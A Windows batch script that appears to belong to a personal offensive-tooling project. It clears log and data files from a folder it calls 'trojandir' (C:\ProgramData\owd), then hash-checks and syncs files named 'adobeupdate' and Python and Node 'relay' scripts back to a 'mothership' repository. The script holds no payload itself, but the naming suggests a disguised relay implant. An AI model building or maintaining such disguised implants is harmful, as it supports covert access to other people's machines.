setlocal enabledelayedexpansion
@echo off

set update=FALSE

echo cmd line args %*

IF "%1"=="update" (
    echo WARNING -- update flag is true --- press enter to proceed
    set /p MyVariable=" "
    timeout /t 3
    SET update=TRUE
)


FOR /F "tokens=1,2" %%A IN ('wmic logicaldisk get name^,volumename 2^>nul ^| findstr /I /C:"MAIN"') DO SET "DRIVE_LETTER=%%A"

set mothershipdir=%DRIVE_LETTER%\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets
set trojandir=C:\ProgramData\owd
cd /d %trojandir%

del /f /q debug_test_*
del /f /q *.log
del /f /q *_running
del /f /q tpl_launch_*
del /f /q tpl_launch.cmd_wmic_process_*
del /f /q *.json
del /f /q *.xml
del /f /q download_*

set adobeupdate=%trojandir%\adobeupdate
set madobeupdate=%mothershipdir%\adobeupdate
set pythonrelay=%trojandir%\pythonrelay.py
set mpythonrelay=%mothershipdir%\pythonrelay.py
set pythonhostrelay=%trojandir%\pythonhostrelay.py
set mpythonhostrelay=%mothershipdir%\pythonhostrelay.py
set nodehostrelay=%trojandir%\nodehostrelay.js
set mnodehostrelay=%mothershipdir%\nodehostrelay.js
set nodehostrelaycmds=%trojandir%\nodehostrelay.cmdslist.js
set mnodehostrelaycmds=%mothershipdir%\nodehostrelay.cmdslist.js
set nodehostrelayhelper=%trojandir%\nodehostrelayhelper.js
set mnodehostrelayhelper=%mothershipdir%\nodehostrelayhelper.js

set files_list=adobeupdate pythonrelay pythonhostrelay nodehostrelay nodehostrelaycmds nodehostrelayhelper

color 0A
for %%f in (%files_list%) do (
    REM echo Item: !%%f! !m%%f!
    certutil -hashfile !%%f! MD5 | find /v ":" > !%%f!.MD5
    certutil -hashfile !m%%f! MD5 | find /v ":" > !m%%f!.MD5
    
    set /p %%fMD5=<!%%f!.MD5
    set /p m%%fMD5=<!m%%f!.MD5

    for /f "delims=" %%A in ("%%fMD5") do (
        
        for /f "delims=" %%B in ("m%%fMD5") do (
            REM echo Value saved in %%fMD5 is: !%%A!
            REM echo Value saved in m%%fMD5 is: !%%B!
        )

    )

    for %%i in ("!%%f!") do set "%%fdt=%%~ti"
    for %%i in ("!m%%f!") do set "m%%fdt=%%~ti"
    
    REM echo !%%fdt!
    REM echo !m%%fdt!

    set check=OK
    IF NOT "!%%fMD5!"=="!m%%fMD5!" (
        set check=ERROR
    )

    set mcheck=OK
    IF NOT "!%%fdt!"=="!m%%fdt!" (
        set mcheck=WARN
    )

    for %%I in ("!m%%f!") do set "filename_with_ext=%%~nxI"

    echo %%f !filename_with_ext! 
    echo mot !%%fMD5! !%%fdt! 
    echo owd !m%%fMD5! !m%%fdt! 
    echo MD5 !check! mod-dt !mcheck!

    IF "%update%"=="TRUE" (
        IF "!check!"=="ERROR" (
            xcopy !%%f! !m%%f! /d /y
        )
    )

)